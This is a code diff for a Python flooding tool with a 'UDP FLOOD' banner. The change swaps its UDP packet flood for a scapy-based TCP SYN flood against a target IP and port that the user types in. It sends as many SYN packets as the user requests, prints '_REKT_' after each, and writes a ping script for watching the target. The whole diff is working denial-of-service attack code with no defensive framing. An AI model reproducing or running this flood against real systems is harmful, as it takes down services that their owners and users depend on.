@@ -1,6 +1,12 @@
 import socket
 import os 
+from scapy.all import * 
 
+def send_syn(TCP_IP, TCP_PORT):
+    ip = IP(dst=TCP_IP)
+    tcp = TCP(dport=TCP_PORT, flags='S')
+    packet = ip/tcp
+    send(packet, verbose=0)
 
 def makebash(ip_address):
     bash_script_name = "ping.sh"
@@ -39,39 +45,29 @@ def color_yellow(text):
 def create_message(size):
     return b'X' * size 
 
-print(color_red(""" 
-
-  _   _ ____  ____    _____ _     ___   ___  ____  
- | | | |  _ \|  _ \  |  ___| |   / _ \ / _ \|  _ \ 
- | | | | | | | |_) | | |_  | |  | | | | | | | | | |
- | |_| | |_| |  __/  |  _| | |__| |_| | |_| | |_| |
-  \___/|____/|_|     |_|   |_____\___/ \___/|____/ 
-                                                   
-
+print(color_red("""                                
+  _    _ _____  _____    ______ _      ____   ____  _____  
+ | |  | |  __ \|  __ \  |  ____| |    / __ \ / __ \|  __ \ 
+ | |  | | |  | | |__) | | |__  | |   | |  | | |  | | |  | |
+ | |  | | |  | |  ___/  |  __| | |   | |  | | |  | | |  | |
+ | |__| | |__| | |      | |    | |___| |__| | |__| | |__| |
+  \____/|_____/|_|      |_|    |______\____/ \____/|_____/ 
+                                                           
+                                                                                        
 """))
 
-UDP_IP = input(color_red("Enter the target IP address (e.g., 127.0.0.1): "))
-UDP_PORT = int(input(color_red("Enter the target port (e.g., 5005): ")))
-packet_size = int(input(color_red("Enter the packet size in bytes (1 - 65507): ")))
-print(color_yellow("File to monitor ping of " + UDP_IP + " will be created. Run ./FLOOD/ping.sh in a seperate terminal after flood has been initialized."))
-amount = int(input(color_red("Enter the number of packets to send: ")))
+TCP_IP = input(color_red("Enter the target IP address: "))
+TCP_PORT = int(input(color_red("Enter the target port number: ")))
+print(color_yellow("File to monitor ping of " + TCP_IP + " will be created. Run ./FLOOD/ping.sh in a seperate terminal after flood has been initialized."))
+amount = int(input(color_red("Number of packets to send:")))
 
-MESSAGE = create_message(packet_size)
-
-print(color_red("UDP target IP: %s" % UDP_IP))
-print(color_red("UDP target port: %s" % UDP_PORT))
-print(color_red("Message size: %s bytes" % packet_size))
-print(color_red("Number of packets to send: %s" % amount))
-
-user_ip = UDP_IP
+user_ip = TCP_IP
     
 makebash(user_ip)
     
-sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-
 for i in range(amount):
-    sock.sendto(MESSAGE, (UDP_IP, UDP_PORT))
-    print(color_white(f"{i + 1}") + color_red("_REKT_") + color_white(f"{i + 1}") + color_red("_REKT_") + color_white(f"{i + 1}") + color_red("_REKT_") + color_white(f"{i + 1}"))
+    send_syn(TCP_IP, TCP_PORT)
+    print(color_yellow(f"{i + 1}") + color_red("_REKT_") + color_yellow(f"{i + 1}") + color_red("_REKT_") + color_yellow(f"{i + 1}") + color_red("_REKT_") + color_yellow(f"{i + 1}"))
 
 print("~DONE~") 
 
